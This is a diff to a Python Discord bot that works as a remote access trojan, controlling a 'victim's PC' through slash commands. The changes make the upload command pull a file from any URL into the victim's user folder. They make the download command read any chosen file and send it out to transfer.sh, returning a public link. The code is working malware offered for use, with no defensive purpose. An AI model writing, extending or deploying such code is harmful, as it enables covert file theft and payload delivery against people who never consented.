@@ -5,7 +5,7 @@ from disnake.ext import commands
 from disnake import Embed
 
 from mss import mss
-from requests import get
+from requests import get, post
 from base64 import decodebytes
 from socket import create_connection
 import os, subprocess, re, time
@@ -157,23 +157,23 @@ async def getcwd(ctx):
     await ctx.response.send_message(embed=EmbedGen("Current directory", "The present directory is: ", f"```{os.getcwd()}```"))
     
 @client.slash_command(description="Uploads file to victim's PC", guild_ids=server_ids)
-async def upload(ctx, file_name, url):
+async def upload(ctx, url, file_name, file_path=f"C:\\Users\\{os.getenv("username")}"):
+    try: os.chdir(file_path)
+    except: return await ctx.response.send_message("invalid dir")
     r = get(url, allow_redirects=True)
-    with open(file_name, "wb") as f: 
-        f.write(r.content)
+    with open(file_name, "wb") as f: f.write(r.content)
     await ctx.response.send_message(embed=EmbedGen("Download information", "Sending file to victim: ", "Success"))
 
 @client.slash_command(description="Downloads file from victim's PC", guild_ids=server_ids)
-async def download(ctx, file_path):
+async def download(ctx, file):
     await ctx.response.defer()
-    try:
-        file=discord.File(file_path)
-        return await ctx.followup.send(embed = Embed(title="Downloaded file from PC:", color = 0x0081FA), file=file)
-    except FileNotFoundError:
-        return await ctx.followup.send(embed=EmbedGen("Error while downloading!", "FileNotFoundError", "Please specify a different path and try again"))
-    except PermissionError:
-        return await ctx.followup.send(embed=EmbedGen("Error while downloading!", "PermissionError", "Please specify a different path and try again"))
-        
+    try: f = open(file, "rb")
+    except: return await ctx.followup.send(embed=EmbedGen("Error while downloading!", "FileNotFoundError", "Please specify a different path and try again"))
+    file = {'{}'.format(file): f}
+    response = post('https://transfer.sh/', files=file)
+    download_link = response.content.decode('utf-8')
+    return await ctx.followup.send("Done! Link is: " + download_link)
+                
 @client.slash_command(description="Change directory to specified location", guild_ids=server_ids)
 async def change_directory(ctx, directory):
     try:
